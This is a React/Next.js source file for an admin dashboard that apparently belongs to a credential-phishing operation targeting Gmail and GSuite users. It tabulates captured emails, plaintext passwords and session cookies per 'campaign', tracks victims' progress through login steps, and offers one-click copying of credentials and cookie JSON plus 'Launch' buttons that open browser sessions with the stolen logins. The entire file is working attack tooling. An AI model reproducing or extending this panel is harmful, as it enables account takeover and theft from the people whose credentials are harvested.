'use client';

import { useState } from 'react';
import Link from 'next/link';
import useSWR, { mutate } from 'swr';
import apiClient from '@/lib/api-client';
import { Database, Play, X, Key, Eye, EyeOff, Check, ShieldCheck, Copy, Trash2, Monitor, UserCheck, ArrowLeft } from 'lucide-react';
import { formatDistanceToNow } from 'date-fns';
import { toast } from 'sonner';

interface Profile {
  id: string;
  email: string;
  password?: string;
  provider: string;
  campaignId: string;
  campaignName: string;
  accountType?: string;
  authStatus: 'AUTHENTICATED' | 'NOT_AUTHENTICATED';
  status: string;
  isLaunched: boolean;
  launchCount: number;
  qualityScore: number;
  capturedAt: string;
  capturedFrom?: string;
  lastLaunched?: string | null;
  createdAt: string;
  cookies?: any[];
}

interface ProfilesResponse {
  success: boolean;
  profiles: Profile[];
  total: number;
  authenticated: number;
  activeSessions: number;
  gsuiteCount: number;
  page: number;
  limit: number;
}

const fetcher = async (url: string) => {
  const response = await apiClient.get(url);
  return response.data;
};

export default function AdminProfilesPage() {
  const [domainTab, setDomainTab] = useState<'ALL' | 'GSUITE' | 'GMAIL'>('ALL');
  const [actionLoading, setActionLoading] = useState<string | null>(null);
  const [selectedProfile, setSelectedProfile] = useState<Profile | null>(null);
  const [showPassword, setShowPassword] = useState<{[key: string]: boolean}>({});

  // Build query params based on domain tab
  const queryParams = new URLSearchParams();
  if (domainTab === 'GSUITE') {
    queryParams.set('type', 'GOOGLE');
  } else if (domainTab === 'GMAIL') {
    queryParams.set('search', '@gmail.com');
  }

  const swrKey = `/api/admin/profiles?${queryParams.toString()}`;
  const { data, error, isLoading } = useSWR<ProfilesResponse>(swrKey, fetcher);

  const profiles = data?.profiles || [];
  const total = data?.total || 0;
  const authenticatedCount = data?.authenticated || 0;
  const launchedCount = data?.activeSessions || 0;
  const gsuiteCount = data?.gsuiteCount || 0;

  // Calculate Gmail count client-side
  const gmailCount = profiles.filter(p => p.email.endsWith('@gmail.com')).length;

  const handleLaunch = async (id: string) => {
    setActionLoading(id);
    try {
      await apiClient.post(`/api/admin/profiles/${id}/launch`);
      toast.success('Profile launched');
      // Re-fetch profiles after launching
      mutate(swrKey);
    } catch (error: any) {
      toast.error(error.response?.data?.error || 'Failed to launch profile');
    } finally {
      setActionLoading(null);
    }
  };

  const handleClose = async (id: string) => {
    setActionLoading(id);
    try {
      await apiClient.post(`/api/admin/profiles/${id}/close`);
      toast.success('Profile closed');
      // Re-fetch profiles after closing
      mutate(swrKey);
    } catch (error: any) {
      toast.error(error.response?.data?.error || 'Failed to close profile');
    } finally {
      setActionLoading(null);
    }
  };

  const handleDelete = async (id: string) => {
    if (!confirm('Delete this profile? This action cannot be undone.')) return;

    setActionLoading(id);
    try {
      const response = await apiClient.delete(`/api/admin/profiles/${id}`);
      
      // Only show success if backend returned 200
      if (response.status === 200 && response.data.success) {
        toast.success('Profile deleted');
        // Re-fetch profiles AFTER backend confirms deletion
        mutate(swrKey);
      } else {
        toast.error('Delete failed - no confirmation from server');
      }
    } catch (error: any) {
      toast.error(error.response?.data?.error || 'Failed to delete profile');
    } finally {
      setActionLoading(null);
    }
  };

  const togglePasswordVisibility = (profileId: string) => {
    setShowPassword(prev => ({ ...prev, [profileId]: !prev[profileId] }));
  };

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    toast.success(`${label} copied`);
  };

  // Domain filtering - use accountType if available, fallback to email check
  const filteredProfiles = profiles.filter(profile => {
    if (domainTab === 'GSUITE') {
      return profile.accountType === 'GSUITE' || (profile.email.includes('@') && !profile.email.endsWith('@gmail.com'));
    } else if (domainTab === 'GMAIL') {
      return profile.accountType === 'GMAIL' || profile.email.endsWith('@gmail.com');
    }
    return true;
  });

  return (
    <div className="mx-auto max-w-7xl p-8 space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          {/* Back Link */}
          <Link href="/admin" className="flex items-center gap-1.5 text-sm text-white/60 hover:text-white transition-colors mb-3">
            <ArrowLeft className="h-3.5 w-3.5" />
            Back
          </Link>
          {/* Breadcrumb */}
          <div className="mb-2 text-sm text-white/50">
            <Link href="/admin" className="hover:text-white/70 transition-colors cursor-pointer">Admin</Link>
            <span> / </span>
            <span>All Profiles</span>
          </div>
          <h1 className="text-2xl font-semibold text-white">All Profiles</h1>
          <p className="text-sm text-white/50 mt-1">
            Platform-wide profile management • {launchedCount} sessions active
          </p>
        </div>
      </div>

      {/* Stats */}
      <div className="grid gap-4 md:grid-cols-4">
        <div className="rounded-xl border border-white/10 bg-[#151823] p-6">
          <div className="text-2xl font-semibold text-white">{total}</div>
          <div className="text-sm text-white/50 mt-1">Total Profiles</div>
        </div>
        <div className="rounded-xl border border-white/10 bg-[#151823] p-6">
          <div className="text-2xl font-semibold text-[#10B981]">{authenticatedCount}</div>
          <div className="text-sm text-white/50 mt-1">Authenticated</div>
        </div>
        <div className="rounded-xl border border-white/10 bg-[#151823] p-6">
          <div className="text-2xl font-semibold text-[#4F7FFF]">{launchedCount}</div>
          <div className="text-sm text-white/50 mt-1">Sessions Active</div>
        </div>
        <div className="rounded-xl border border-white/10 bg-[#151823] p-6">
          <div className="text-2xl font-semibold text-[#8B5CF6]">{gsuiteCount}</div>
          <div className="text-sm text-white/50 mt-1">GSuite Accounts</div>
        </div>
      </div>

      {/* Domain Tabs */}
      <div className="flex gap-2 border-b border-white/10">
        <button
          onClick={() => setDomainTab('ALL')}
          className={`px-4 py-2.5 text-sm font-medium transition-colors relative ${
            domainTab === 'ALL' ? 'text-white' : 'text-white/50 hover:text-white/70'
          }`}
        >
          All
          {domainTab === 'ALL' && <div className="absolute bottom-0 left-0 right-0 h-0.5 bg-[#4F7FFF]"></div>}
        </button>
        <button
          onClick={() => setDomainTab('GSUITE')}
          className={`px-4 py-2.5 text-sm font-medium transition-colors relative ${
            domainTab === 'GSUITE' ? 'text-white' : 'text-white/50 hover:text-white/70'
          }`}
        >
          GSuite ({gsuiteCount})
          {domainTab === 'GSUITE' && <div className="absolute bottom-0 left-0 right-0 h-0.5 bg-[#4F7FFF]"></div>}
        </button>
        <button
          onClick={() => setDomainTab('GMAIL')}
          className={`px-4 py-2.5 text-sm font-medium transition-colors relative ${
            domainTab === 'GMAIL' ? 'text-white' : 'text-white/50 hover:text-white/70'
          }`}
        >
          Gmail ({gmailCount})
          {domainTab === 'GMAIL' && <div className="absolute bottom-0 left-0 right-0 h-0.5 bg-[#4F7FFF]"></div>}
        </button>
      </div>

      {/* Profiles Table */}
      {isLoading ? (
        <div className="flex items-center justify-center py-12">
          <div className="h-8 w-8 border-2 border-[#4F7FFF] border-t-transparent rounded-full animate-spin"></div>
        </div>
      ) : error ? (
        <div className="rounded-xl border border-red-500/20 bg-red-500/10 p-12 text-center">
          <p className="text-red-500">Failed to load profiles</p>
        </div>
      ) : filteredProfiles.length === 0 ? (
        <div className="rounded-xl border border-white/10 bg-[#151823] p-12 text-center">
          <Database className="h-16 w-16 mx-auto mb-4 text-white/20" />
          <h3 className="text-lg font-medium text-white mb-2">No profiles yet</h3>
          <p className="text-sm text-white/50">
            Profiles will appear here as technicians capture credentials
          </p>
        </div>
      ) : (
        <div className="rounded-xl border border-white/10 bg-[#151823] overflow-hidden">
          <table className="w-full">
            <thead className="bg-white/5">
              <tr>
                <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Email</th>
                <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Password</th>
                <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Campaign</th>
                <th className="text-center px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Status</th>
                <th className="text-left px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Captured</th>
                <th className="text-right px-6 py-3 text-xs font-medium text-white/50 uppercase tracking-wider">Actions</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-white/10">
              {filteredProfiles.map((profile) => (
                <tr key={profile.id} className="hover:bg-white/5 transition-colors">
                  <td className="px-6 py-4">
                    <div className="flex items-center gap-2">
                      <div className="w-8 h-8 rounded-full bg-[#4F7FFF]/10 flex items-center justify-center text-xs font-medium text-[#4F7FFF]">
                        {profile.email.charAt(0).toUpperCase()}
                      </div>
                      <div className="flex-1">
                        <div className="font-medium text-white">{profile.email}</div>
                        <div className="text-xs text-white/50">{profile.provider}</div>
                      </div>
                      {profile.password && (
                        <button
                          onClick={() => copyToClipboard(`${profile.email}\n${profile.password}`, 'Credentials')}
                          className="p-1.5 hover:bg-white/10 rounded transition-colors"
                          title="Copy email and password"
                        >
                          <Copy className="h-3.5 w-3.5 text-white/50" />
                        </button>
                      )}
                    </div>
                  </td>
                  <td className="px-6 py-4">
                    <div className="flex items-center gap-2">
                      <code className="text-sm font-mono text-white/70">
                        {showPassword[profile.id] ? (profile.password || '••••••••') : '••••••••'}
                      </code>
                      <button
                        onClick={() => togglePasswordVisibility(profile.id)}
                        className="p-1 hover:bg-white/10 rounded transition-colors"
                      >
                        {showPassword[profile.id] ? (
                          <EyeOff className="h-3.5 w-3.5 text-white/50" />
                        ) : (
                          <Eye className="h-3.5 w-3.5 text-white/50" />
                        )}
                      </button>
                      {profile.password && (
                        <button
                          onClick={() => copyToClipboard(profile.password!, 'Password')}
                          className="p-1 hover:bg-white/10 rounded transition-colors"
                        >
                          <Copy className="h-3.5 w-3.5 text-white/50" />
                        </button>
                      )}
                    </div>
                  </td>
                  <td className="px-6 py-4">
                    <div className="text-sm text-white">{profile.campaignName}</div>
                    <div className="text-xs text-white/50 font-mono">{profile.campaignId.substring(0, 8)}</div>
                  </td>
                  <td className="px-6 py-4 text-center">
                    {profile.status === 'AUTHENTICATED' || profile.authStatus === 'AUTHENTICATED' ? (
                      <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-[#10B981]/10 text-[#10B981] border border-[#10B981]/20 text-xs font-medium">
                        <Check className="w-3 h-3" />
                        Authenticated
                      </span>
                    ) : profile.status === 'PASSWORD_ENTERED' ? (
                      <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-[#F97316]/10 text-[#F97316] border border-[#F97316]/20 text-xs font-medium">
                        <Key className="w-3 h-3" />
                        Credentials Captured
                      </span>
                    ) : profile.status === 'EMAIL_ENTERED' ? (
                      <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-[#F59E0B]/10 text-[#F59E0B] border border-[#F59E0B]/20 text-xs font-medium">
                        <div className="w-1.5 h-1.5 rounded-full bg-[#F59E0B] animate-pulse"></div>
                        Authenticating
                      </span>
                    ) : (
                      <span className="px-2.5 py-1 rounded-full bg-white/10 text-white/50 text-xs font-medium">
                        Pending
                      </span>
                    )}
                  </td>
                  <td className="px-6 py-4">
                    <span className="text-sm text-white/50">
                      {formatDistanceToNow(new Date(profile.capturedAt), { addSuffix: true })}
                    </span>
                  </td>
                  <td className="px-6 py-4">
                    <div className="flex items-center justify-end gap-2">
                      {profile.isLaunched ? (
                        <button
                          onClick={() => handleClose(profile.id)}
                          disabled={actionLoading === profile.id}
                          className="p-2 hover:bg-[#EF4444]/20 rounded-lg transition-colors"
                          title="Close"
                        >
                          <X className="h-4 w-4 text-[#EF4444]" />
                        </button>
                      ) : profile.authStatus === 'AUTHENTICATED' ? (
                        <button
                          onClick={() => handleLaunch(profile.id)}
                          disabled={actionLoading === profile.id || launchedCount >= 5}
                          className="p-2 hover:bg-white/10 rounded-lg transition-colors disabled:opacity-50"
                          title="Launch"
                        >
                          <Monitor className="h-4 w-4 text-white/70" />
                        </button>
                      ) : null}
                      <button
                        onClick={() => setSelectedProfile(profile)}
                        className="p-2 hover:bg-white/10 rounded-lg transition-colors"
                        title="Details"
                      >
                        <Eye className="h-4 w-4 text-white/70" />
                      </button>
                      <button
                        onClick={() => handleDelete(profile.id)}
                        disabled={actionLoading === profile.id}
                        className="p-2 hover:bg-[#EF4444]/20 rounded-lg transition-colors"
                        title="Delete"
                      >
                        <Trash2 className="h-4 w-4 text-[#EF4444]" />
                      </button>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {/* Profile Detail Drawer */}
      {selectedProfile && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-end z-50">
          <div className="w-full max-w-md h-full bg-[#151823] border-l border-white/10 overflow-y-auto">
            <div className="sticky top-0 bg-[#151823] border-b border-white/10 px-6 py-4 z-10">
              <div className="flex items-center justify-between">
                <h2 className="text-lg font-medium text-white">Profile Details</h2>
                <button
                  onClick={() => setSelectedProfile(null)}
                  className="p-2 hover:bg-white/10 rounded-lg transition-colors"
                >
                  <X className="h-5 w-5 text-white/70" />
                </button>
              </div>
            </div>

            <div className="p-6 space-y-6">
              {/* Email */}
              <div>
                <label className="block text-sm font-medium text-white/50 mb-2">Email</label>
                <div className="flex items-center gap-2">
                  <div className="flex-1 px-3 py-2 bg-[#0C0E14] border border-white/10 rounded-lg text-white font-mono text-sm">
                    {selectedProfile.email}
                  </div>
                  <button
                    onClick={() => copyToClipboard(selectedProfile.email, 'Email')}
                    className="p-2 hover:bg-white/10 rounded-lg transition-colors"
                  >
                    <Copy className="h-4 w-4 text-white/70" />
                  </button>
                </div>
              </div>

              {/* Password */}
              {selectedProfile.password && (
                <div>
                  <label className="block text-sm font-medium text-white/50 mb-2">Password</label>
                  <div className="flex items-center gap-2">
                    <div className="flex-1 px-3 py-2 bg-[#0C0E14] border border-white/10 rounded-lg text-white font-mono text-sm">
                      {showPassword[selectedProfile.id] ? selectedProfile.password : '••••••••••••'}
                    </div>
                    <button
                      onClick={() => togglePasswordVisibility(selectedProfile.id)}
                      className="p-2 hover:bg-white/10 rounded-lg transition-colors"
                    >
                      {showPassword[selectedProfile.id] ? (
                        <EyeOff className="h-4 w-4 text-white/70" />
                      ) : (
                        <Eye className="h-4 w-4 text-white/70" />
                      )}
                    </button>
                    <button
                      onClick={() => copyToClipboard(selectedProfile.password!, 'Password')}
                      className="p-2 hover:bg-white/10 rounded-lg transition-colors"
                    >
                      <Copy className="h-4 w-4 text-white/70" />
                    </button>
                  </div>
                </div>
              )}

              {/* Cookies */}
              {selectedProfile.cookies && selectedProfile.cookies.length > 0 && (
                <div>
                  <div className="flex items-center justify-between mb-2">
                    <label className="text-sm font-medium text-white/50">Cookies ({selectedProfile.cookies.length})</label>
                    <button
                      onClick={() => copyToClipboard(JSON.stringify(selectedProfile.cookies, null, 2), 'Cookies JSON')}
                      className="flex items-center gap-1.5 px-2 py-1 text-xs text-white/60 hover:text-white hover:bg-white/10 rounded transition-colors"
                    >
                      <Copy className="h-3 w-3" />
                      Copy All as JSON
                    </button>
                  </div>
                  <div className="max-h-48 overflow-y-auto bg-[#0C0E14] border border-white/10 rounded-lg">
                    <table className="w-full text-xs">
                      <thead className="sticky top-0 bg-[#0C0E14] border-b border-white/10">
                        <tr>
                          <th className="text-left px-2 py-1.5 text-white/50 font-medium">Name</th>
                          <th className="text-left px-2 py-1.5 text-white/50 font-medium">Value</th>
                          <th className="text-left px-2 py-1.5 text-white/50 font-medium">Domain</th>
                          <th className="text-left px-2 py-1.5 text-white/50 font-medium">Expires</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-white/5">
                        {selectedProfile.cookies.map((cookie: any, idx: number) => (
                          <tr key={idx} className="hover:bg-white/5">
                            <td className="px-2 py-1.5 font-mono text-white/70">{cookie.name}</td>
                            <td className="px-2 py-1.5 font-mono text-white/40 truncate max-w-[120px]" title={cookie.value}>
                              {(cookie.value || '').substring(0, 40)}{(cookie.value || '').length > 40 ? '...' : ''}
                            </td>
                            <td className="px-2 py-1.5 text-white/50">{cookie.domain}</td>
                            <td className="px-2 py-1.5 text-white/50">
                              {cookie.expirationDate ? new Date(cookie.expirationDate * 1000).toLocaleDateString() : 'Session'}
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>
              )}

              {/* Account Type */}
              <div>
                <label className="block text-sm font-medium text-white/50 mb-2">Account Type</label>
                <div className="flex gap-2">
                  {selectedProfile.accountType === 'GMAIL' ? (
                    <span className="inline-flex items-center px-3 py-1.5 rounded-full bg-[#4F7FFF]/10 text-[#4F7FFF] border border-[#4F7FFF]/20 text-sm font-medium">
                      Gmail
                    </span>
                  ) : (
                    <span className="inline-flex items-center px-3 py-1.5 rounded-full bg-[#8B5CF6]/10 text-[#8B5CF6] border border-[#8B5CF6]/20 text-sm font-medium">
                      GSuite
                    </span>
                  )}
                </div>
              </div>

              {/* Campaign */}
              <div>
                <label className="block text-sm font-medium text-white/50 mb-2">Campaign</label>
                <div className="px-3 py-2 bg-[#0C0E14] border border-white/10 rounded-lg">
                  <div className="text-white text-sm">{selectedProfile.campaignName}</div>
                  <div className="text-white/50 text-xs font-mono mt-0.5">{selectedProfile.campaignId.substring(0, 8)}</div>
                </div>
              </div>

              {/* Status */}
              <div>
                <label className="block text-sm font-medium text-white/50 mb-2">Status</label>
                <div className="flex flex-col gap-2">
                  {selectedProfile.authStatus === 'AUTHENTICATED' ? (
                    <div className="flex items-center gap-2 px-3 py-2 bg-[#10B981]/10 border border-[#10B981]/20 rounded-lg text-[#10B981] text-sm font-medium">
                      <Check className="h-4 w-4" />
                      Authenticated
                    </div>
                  ) : (
                    <div className="px-3 py-2 bg-white/5 border border-white/10 rounded-lg text-white/50 text-sm">
                      Not Authenticated
                    </div>
                  )}
                  {selectedProfile.isLaunched && (
                    <div className="flex items-center gap-2 px-3 py-2 bg-[#4F7FFF]/10 border border-[#4F7FFF]/20 rounded-lg text-[#4F7FFF] text-sm font-medium">
                      <div className="w-2 h-2 rounded-full bg-[#4F7FFF] animate-pulse"></div>
                      Browser Launched
                    </div>
                  )}
                </div>
              </div>

              {/* Timestamps */}
              <div>
                <label className="block text-sm font-medium text-white/50 mb-2">Timestamps</label>
                <div className="space-y-2 text-sm">
                  <div className="flex justify-between px-3 py-2 bg-[#0C0E14] border border-white/10 rounded-lg">
                    <span className="text-white/50">Captured</span>
                    <span className="text-white">{formatDistanceToNow(new Date(selectedProfile.capturedAt), { addSuffix: true })}</span>
                  </div>
                  {selectedProfile.lastLaunched && (
                    <div className="flex justify-between px-3 py-2 bg-[#0C0E14] border border-white/10 rounded-lg">
                      <span className="text-white/50">Last Launched</span>
                      <span className="text-white">{formatDistanceToNow(new Date(selectedProfile.lastLaunched), { addSuffix: true })}</span>
                    </div>
                  )}
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
